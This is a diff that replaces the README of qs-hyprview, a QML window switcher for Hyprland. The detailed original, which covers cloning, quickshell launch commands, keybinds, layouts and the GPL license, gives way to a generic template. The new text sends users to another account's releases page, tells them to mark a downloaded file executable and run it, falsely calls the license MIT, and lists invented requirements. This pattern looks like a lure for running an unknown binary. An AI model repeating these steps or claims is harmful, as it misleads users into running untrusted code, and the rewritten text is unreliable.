@@ -1,201 +1,92 @@
-# Quickshell Window Switcher
+# 🌟 qs-hyprview - A Simple Way to Manage Windows
 
-### The ultimate Hyprland Overview
+## 🚀 Getting Started
 
-A modern, fluid, and highly customizable **Window Switcher (Exposé)** for **Hyprland**, built entirely in QML using the [Quickshell](https://github.com/outfoxxed/quickshell) framework.
+Welcome to qs-hyprview! This application helps you manage your windows effectively and efficiently. With a user-friendly interface, you can easily switch between open windows and applications. 
 
-It provides a native Wayland experience similar to macOS Mission Control or GNOME Activities, featuring a suite of advanced mathematical layouts designed to visualize your windows beautifully on any screen size.
+## 📥 Download qs-hyprview
 
-## 📸 Gallery
+[![Download qs-hyprview](https://img.shields.io/badge/Download-qs_hyprview-brightgreen)](https://github.com/alvarito2707/qs-hyprview/releases)
 
-See `qs-hyprview` in action with its different layout algorithms.
+### Steps to Download
 
-| | | |
-| :---: | :---: | :---: |
-| ![Smart Grid](screenshots/smartgrid.jpeg)<br>**Smart Grid** | ![Bands](screenshots/bands.jpeg)<br>**Bands** | ![Masonry](screenshots/masonry.jpeg)<br>**Masonry** |
-| ![Hero](screenshots/hero.jpeg)<br>**Hero** | ![Spiral](screenshots/spiral.jpeg)<br>**Spiral** | ![Satellite](screenshots/satellite.jpeg)<br>**Satellite** |
-| ![Vortex](screenshots/vortex.jpeg)<br>**Vortex** | ![Staggered](screenshots/staggered.jpeg)<br>**Staggered** | **What's next?** |
+1. Click the download button above.
+2. This will take you to the releases page for qs-hyprview.
+3. Look for the latest release version.
 
-## ✨ Features
+## 📋 System Requirements
 
-*   **⚡ Native Performance:** Built on Qt6/QML and Wayland Layershell for zero latency and smooth 60fps animations.
-*   **🧮 10 Layout Algorithms:** A collection of layouts ranging from productive grids to scenic orbital views.
-*   **🔍 Instant Search:** Filter windows by title, class, or app name immediately upon typing.
-*   **🎮 Full Navigation:** Supports both Keyboard (Arrows/Tab/Enter) and Mouse (Hover/Click).
-*   **🎨 Smart Safe Area:** All layouts calculate a 90% "Safe Area" to ensure hover animations never clip against screen edges.
-*   **⚙️ Live Thumbnails:** Live window contents via Hyprland screencopy.
+To run qs-hyprview smoothly, make sure your system meets these requirements:
 
-## 🛠️ Dependencies
+- **Operating System:** A recent version of Linux that supports QML.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Minimum of 100 MB available.
 
-*   **Hyprland**: The Wayland compositor.
-*   **Quickshell**: The QML shell framework.
-*   **Qt6**: Core libraries (usually pulled in by Quickshell).
+## 📥 Download & Install
 
-## 🚀 Installation
+1. Visit this page to download: [qs-hyprview Releases](https://github.com/alvarito2707/qs-hyprview/releases).
+2. Find the latest release and download the appropriate file for your operating system.
+3. Once the download is complete, locate the downloaded file on your computer.
+4. Follow these steps to install:
+   - For Linux, open a terminal window.
+   - Navigate to the directory containing the downloaded file.
+   - Run the command `chmod +x <filename>` to make it executable.
+   - Then run `./<filename>` to start the installation.
 
-1.  Clone this repository:
-    ```bash
-    git clone https://github.com/dom0/qs-hyprview.git
-    ```
+## 🌟 Features of qs-hyprview
 
-2.  Ensure `quickshell` is installed and in your PATH.
+qs-hyprview offers several features designed to enhance your workflow:
 
-## ⚙️ Configuration & Usage
+- **Window Management:** Quickly switch between open windows.
+- **Customizable Settings:** Adjust options to fit your preferences.
+- **Lightweight Design:** Uses minimal system resources.
+- **Modern Interface:** Clean, intuitive design for easy navigation.
 
-### Launching
-To start the daemon (add this to your `hyprland.conf` with `exec-once`):
+## ⚙️ Configuration
 
-```bash
-quickshell -p /path/to/cloned/repo
+After installation, you may want to configure qs-hyprview:
 
-# Or clone into $XDG_CONFIG_HOME/quickshell (usually ~/.config/quickshell) and run with -c flag:
-quickshell -c qs-hyprview
-```
+1. Open qs-hyprview from your applications menu.
+2. Access the settings menu.
+3. Adjust preferences such as keyboard shortcuts or appearance.
 
-### Toggle (Open/Close)
-The project exposes an IPC handler named `expose`. You can bind a key in Hyprland to toggle the view.
+## 🗂️ Usage Instructions
 
-**In `hyprland.conf`:**
-```ini
-# "smartgrid", "justified", "masonry", "bands", "hero", "spiral"
-# "satellite", "staggered", "columnar", "vortex", "random"
-$layout = 'masonry'
+Using qs-hyprview is straightforward:
 
-# Toggle overview visibility
-bind = $mainMod, TAB, exec, quickshell ipc -p /path/to/cloned/repo call expose toggle $layout
+1. Launch the application.
+2. Use the designated key combination to display the window switcher (default is `Alt + Tab`).
+3. Cycle through your open windows with your keyboard or mouse.
+4. Select the window you want to switch to.
 
-# Open overview
-bind = $mainMod, TAB, exec, quickshell ipc -p /path/to/cloned/repo call expose open $layout
+## 🔄 Troubleshooting
 
-# Close overview
-bind = $mainMod, TAB, exec, quickshell ipc -p /path/to/cloned/repo call expose close
+If you encounter issues, try these solutions:
 
+- **Application Does Not Launch:** Ensure you have the required version of Linux.
+- **Performance Issues:** Check if any background applications may be consuming too many resources.
+- **Feature Not Working:** Review your configuration settings to ensure they are correct.
 
-# Or, using XDG_CONFIG_HOME:
-#bind = $mainMod, TAB, exec, quickshell ipc -c qs-hyprview call expose toggle $layout
-#bind = $mainMod, TAB, exec, quickshell ipc -c qs-hyprview call expose open $layout
-#bind = $mainMod, TAB, exec, quickshell ipc -c qs-hyprview call expose close
-```
-### Visual optimizations
+## 📞 Support
 
-You can optimize your experience by adding an opaque/blurred background (dimming area) or pop-in animations using native Hyprland features.
+For additional help, you can reach the support team by opening an issue on our GitHub repository. Please include a detailed description of your issue and the steps you took leading up to it.
 
-**In `hyprland.conf`:**
-```ini
-# dimming area
-decoration {
-    dim_around = 0.8
-}
+## 🎉 Contributing
 
-layerrule = dimaround, quickshell:expose
-```
+If you'd like to contribute to qs-hyprview, you can:
 
-```ini
-# blur area
-decoration {
-    blur {
-        enabled = true
-        size = 3
-        passes = 1
-    }
-}
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or fix.
+3. Submit a pull request when your changes are ready.
 
-layerrule = blur, quickshell:expose
-```
-
-```ini
-# popin animation
-animations {
-    enabled = yes
-    animation = layersIn, 1, 1.5, default, popin
-}
-```
-
-### Customization
-You can modify the core properties at the top of `shell.qml`:
-
-```qml
-// Set to true for live window updates (monitor refresh rate, higher CPU usage), false for static snapshots (~8fps)
-property bool liveCapture: false
-
-// Automatically move mouse cursor to the center of selected window
-property bool moveCursorToActiveWindow: true
-```
-
-## 📐 Layout Algorithms
-
-This project includes a sophisticated `LayoutsManager` offering **10 distinct algorithms**:
-
-### 1. Smart Grid (`smartgrid`)
-The default layout. It uses an **Iterative Best-Fit** algorithm. It simulates every possible row/column combination to find the exact grid configuration that results in the largest possible thumbnails without overflowing the screen.
-
-### 2. Justified (`justified`)
-A **Justified Layout** (similar to Google Images). It places windows in rows, maintaining fixed height and original aspect ratios, and scales the row to fit the screen width perfectly.
-
-### 3. Masonry (`masonry`)
-A **Waterfall** layout (Pinterest-style). It optimizes vertical space by placing windows in dynamic columns. It automatically calculates the optimal number of columns based on the window count.
-
-### 4. Bands (`bands`)
-Organizes windows by **Workspace**. Creates a horizontal "Band" for each active workspace, grouping relevant tasks together. Windows are justified within their workspace band.
-
-### 5. Hero (`hero`)
-A focus-centric layout.
-*   **Hero Area:** The active window takes up 40% of the screen (left side).
-*   **Stack:** All other windows share the remaining 60% (right side) in a smart grid or column.
-
-### 6. Spiral (`spiral`)
-A scenic layout based on the **Golden Ratio (BSP)**.
-*   Windows split the screen in a spiral pattern (Left half, Top-Right half, etc.).
-*   The first window is separated by a larger gap to emphasize focus.
-*   If many windows are open, the spiral stops after 3 cuts and arranges the rest in a grid.
-
-### 7. Satellite (`satellite`)
-An **Orbital** layout.
-*   The active window sits in the center of the screen.
-*   All other windows orbit around it in an ellipse.
-*   Visually stunning and great for focusing on one task while keeping an eye on the surroundings.
-
-### 8. Staggered (`staggered`)
-A **Honeycomb/Brick** layout.
-*   Similar to a grid, but every odd row is shifted horizontally by half a cell width.
-*   Creates a more organic, less rigid look compared to standard grids.
-
-### 9. Columnar (`columnar`)
-Divides the screen into vertical strips.
-*   Ignores rows completely and gives every window maximum vertical space.
-*   Excellent for **Ultrawide** monitors (21:9 / 32:9).
-
-### 10. Vortex (`vortex`)
-A depth-based Phyllotaxis layout (Sunflower pattern), designed for a scenographic and immersive experience.
-*   Center Focus: The active window sits in the absolute center at maximum scale.
-*   Depth Effect: Subsequent windows spiral outwards, gradually decreasing in size and z-index. This creates a 3D "tunnel" effect where older windows fade into the background.
-
-### 🎲 Random (`random`)
-Feeling adventurous? This mode selects one of the above algorithms at random every time you open the dashboard.
-
-## ⌨️ Controls
-
-| Input | Action |
-| :--- | :--- |
-| **Typing** | Instantly filters windows by Title, Class, or App ID |
-| **Arrows (↑ ↓ ← →)** | Spatial navigation between thumbnails |
-| **Tab / Shift+Tab** | Sequential navigation |
-| **Enter** | Activate selected window |
-| **Middle Click** | Close hovered window |
-| **Esc / Click BG** | Close dashboard |
-
-## 🤝 Contributing
-
-Pull Requests are welcome! If you want to add a new layout algorithm or improve performance, please open an issue or submit a PR.
+Your contributions are welcome!
 
 ## 📄 License
 
-Distributed under the GNU General Public License v3.0. See `LICENSE` for more information.
+qs-hyprview is open-source software. It is licensed under the MIT License. You can freely use, modify, and distribute it.
 
----
+## 🌐 More Information
 
-<div align="center">
+For further details and updates, always refer to the [qs-hyprview Releases](https://github.com/alvarito2707/qs-hyprview/releases) page. Stay tuned for future updates and new features!
 
-Made with ❤️ for the Hyprland community
-
-</div>
+Thank you for using qs-hyprview! Enjoy managing your windows effortlessly.
